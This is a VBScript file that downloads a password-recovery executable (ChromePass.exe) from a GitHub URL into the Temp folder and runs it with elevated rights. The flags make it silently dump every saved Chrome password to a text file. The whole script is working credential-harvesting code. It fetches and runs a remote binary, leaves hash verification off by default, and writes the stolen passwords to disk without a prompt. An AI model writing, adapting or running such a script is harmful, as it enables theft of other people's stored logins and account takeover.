Option Explicit

Dim filename, exePath, outputFolder, outputFile, args, fso, shellApp, shell, tempFolder
Dim downloadURL, downloadSuccess, expectedHash

' Direct raw GitHub URL (downloads the binary file)
downloadURL = "https://raw.githubusercontent.com/Cybertoonv/Scripts/main/passreccommandline/ChromePass.exe"

' OPTIONAL: set expected SHA256 checksum (uppercase, no spaces). Leave "" to skip verification.
expectedHash = "" ' e.g. "A1B2C3...F"

Set shell = CreateObject("WScript.Shell")
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")

filename = "ChromePass.exe"
exePath = tempFolder & "\" & filename

Set fso = CreateObject("Scripting.FileSystemObject")

' Always download (overwrite) to ensure latest version
downloadSuccess = DownloadFile(downloadURL, exePath)
If Not downloadSuccess Then
    MsgBox "Failed to download " & filename & " to Temp folder.", vbCritical, "Download Error"
    WScript.Quit
End If

' If expectedHash is set, verify SHA256
If Trim(expectedHash) <> "" Then
    If Not VerifySHA256(expectedHash, exePath) Then
        MsgBox "Checksum verification failed. The downloaded file may be corrupt or tampered with.", vbCritical, "Checksum Error"
        ' Optionally delete the bad download:
        On Error Resume Next
        If fso.FileExists(exePath) Then fso.DeleteFile exePath, True
        On Error GoTo 0
        WScript.Quit
    End If
End If

If Not fso.FileExists(exePath) Then
    MsgBox "ChromePass.exe not found in Temp folder.", vbCritical, "Error"
    WScript.Quit
End If

' Store extracted passwords in %TEMP%\ExtractedPasswords
outputFolder = tempFolder & "\ExtractedPasswords"
outputFile = outputFolder & "\ChromePasswords.txt"

If Not fso.FolderExists(outputFolder) Then
    fso.CreateFolder(outputFolder)
End If

args = "/stext """ & outputFile & """ /all /savesilent"

Set shellApp = CreateObject("Shell.Application")
shellApp.ShellExecute exePath, args, "", "runas", 1


' === Function to download a file (binary safe) ===
Function DownloadFile(url, savePath)
    On Error Resume Next
    Dim xmlhttp, adoStream, result
    result = False

    Set xmlhttp = CreateObject("MSXML2.XMLHTTP")
    xmlhttp.Open "GET", url, False
    xmlhttp.Send

    If xmlhttp.Status = 200 Then
        Set adoStream = CreateObject("ADODB.Stream")
        adoStream.Type = 1 ' adTypeBinary
        adoStream.Open
        adoStream.Write xmlhttp.responseBody
        ' Overwrite if exists
        If CreateObject("Scripting.FileSystemObject").FileExists(savePath) Then
            CreateObject("Scripting.FileSystemObject").DeleteFile savePath, True
        End If
        adoStream.SaveToFile savePath, 2 ' adSaveCreateOverWrite
        adoStream.Close
        result = True
    Else
        result = False
    End If

    On Error GoTo 0
    DownloadFile = result
End Function

' === Verify SHA256 using certutil (Windows built-in) ===
Function VerifySHA256(expected, filePath)
    On Error Resume Next
    Dim execObj, output, line, actualHash, arrLines, i
    Set execObj = CreateObject("WScript.Shell").Exec("cmd /c certutil -hashfile """ & filePath & """ SHA256")
    output = ""
    Do While Not execObj.StdOut.AtEndOfStream
        line = execObj.StdOut.ReadLine()
        output = output & line & vbCrLf
    Loop

    ' Parse output: certutil prints hash on the second non-empty line typically
    arrLines = Split(output, vbCrLf)
    actualHash = ""
    For i = 0 To UBound(arrLines)
        line = Trim(arrLines(i))
        If Len(line) = 64 Then
            actualHash = line
            Exit For
        End If
    Next

    If actualHash = "" Then
        VerifySHA256 = False
    Else
        ' normalize case and compare
        If UCase(actualHash) = UCase(Trim(expected)) Then
            VerifySHA256 = True
        Else
            VerifySHA256 = False
        End If
    End If

    On Error GoTo 0
End Function
